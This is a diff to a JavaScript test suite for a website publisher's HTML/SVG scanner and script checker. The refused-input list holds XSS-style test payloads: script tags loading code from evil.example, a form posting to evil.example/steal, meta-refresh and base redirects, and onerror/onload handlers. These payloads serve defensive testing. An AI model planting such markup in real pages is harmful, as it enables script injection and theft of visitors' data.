@@ -46,12 +46,15 @@ const test = async (name, fn) => { await fn(); count++; };
       '<a href=\'vbscript:x\'>x</a>', '<img src="data:text/html,<script>1</script>">', '<script src="https://evil.example/x.js"></script>', '<script src=//evil.example/x.js></script>',
       '<script type="module" src="https://evil.example/m.js"></script>', '<iframe src="https://evil.example"></iframe>', '<form action="https://evil.example/steal"><input name=a></form>',
       '<form action="//evil.example"></form>', '<button formaction="https://evil.example">x</button>', '<base href="https://evil.example/">', '<object data="x.swf"></object>',
-      '<embed src="x.swf">', '<meta http-equiv="refresh" content="0;url=https://evil.example">'
+      '<embed src="x.swf">', '<meta http-equiv="refresh" content="0;url=https://evil.example">',
+      '<script>document.title="x"</script>', '<script type="text/javascript">alert(1)</script>', '<script type="module">import("x")</script>', '<img src=x onerror="alert(1)">', '<body onload="x()">',
+      '<a href="/" onclick="x()">a</a>', '<svg onload="x()"></svg>', '<div ONMOUSEOVER=x>', '<iframe srcdoc="<script>1</script>"></iframe>'
     ];
     for (const h of refused) assert(P.scanHtml(h).length, 'should be refused: ' + h);
-    const fine = ['<a href="/about">About</a>', '<a href="https://example.com/">Elsewhere</a>', '<a href="mailto:a@b.lv">mail</a>', '<script src="/js/app.js" defer></script>', '<script>document.title="x"</script>',
+    const fine = ['<a href="/about">About</a>', '<a href="https://example.com/">Elsewhere</a>', '<a href="mailto:a@b.lv">mail</a>', '<script src="/js/app.js" defer></script>', '<script type="application/ld+json">{"@type":"Thing"}</script>',
       '<img src="logo.png" alt="">', '<img src="data:image/png;base64,iVBORw0KGgo=">', '<form action="/thanks" method="post"></form>', '<link rel="stylesheet" href="style.css">', '<a href="#top">up</a>'];
     for (const h of fine) assert.deepStrictEqual(P.scanHtml(h), [], 'should pass: ' + h);
+    assert.deepStrictEqual(P.scanHtml('<p>one</p><section id="on-sale" data-on="x" class="online">ok</section>'), [], 'attributes that only start with the letters "on" are not handlers');
     assert(P.scanSvg('<svg><script>alert(1)</script></svg>').length && P.scanSvg('<svg onload="x()"></svg>').length && P.scanSvg('<svg><a href="javascript:x"/></svg>').length && P.scanSvg('<svg><foreignObject/></svg>').length);
     assert.deepStrictEqual(P.scanSvg('<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>'), []);
   });
@@ -61,6 +64,28 @@ const test = async (name, fn) => { await fn(); count++; };
     const t = Date.now();
     for (const c of cases) { P.scanHtml(c); P.scanSvg(c); }
     assert(Date.now() - t < 3000, 'scanning took ' + (Date.now() - t) + ' ms');
+  });
+
+  await test('scripts: without a checker none is accepted; with one, only what it approves; other pages are not affected', async () => {
+    const js = (content) => ({ path: 'script.js', content });
+    const plain = setup();
+    plain.f.addEntitlement('u1', FUTURE);
+    const noChecker = await plain.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), js('alert(1)')] });
+    assert.strictEqual(noChecker.status, 400); assert(/scripts cannot be published here/.test(noChecker.json.errors[0])); assert.strictEqual(plain.f.sites.length, 0, 'nothing is created');
+    const calls = [];
+    const scripts = { check: async (text) => { calls.push(text); return text === 'GOOD' ? { ok: true } : { ok: false, problem: 'Not the library\'s own.' }; } };
+    const withChecker = setup({ scripts });
+    withChecker.f.addEntitlement('u1', FUTURE);
+    const bad = await withChecker.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), js('evil()')] });
+    assert.strictEqual(bad.status, 400); assert.strictEqual(bad.json.reason, 'files'); assert(/“script.js”: Not the library's own\. Reload the builder/.test(bad.json.errors[0]), bad.json.errors[0]);
+    assert.strictEqual(withChecker.f.sites.length, 0, 'a refused script creates nothing and uses no paid place');
+    const other = await withChecker.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), { path: 'extra/page.js', content: 'GOOD' }, js('GOOD')] });
+    assert.strictEqual(other.status, 200, JSON.stringify(other.json)); assert.deepStrictEqual(calls.slice(-2), ['GOOD', 'GOOD'], 'every .js file is checked, whatever its name');
+    const before = calls.length;
+    assert.strictEqual((await withChecker.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), css] })).status, 200);
+    assert.strictEqual(calls.length, before, 'a site with no scripts needs no check');
+    const mixed = await withChecker.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), js('GOOD'), { path: 'vendor/lib.js', content: 'evil()' }] });
+    assert.strictEqual(mixed.status, 400, 'one bad script among good ones refuses the whole publish');
   });
 
   await test('entitlement states: active, grace for 14 days, ended', () => {
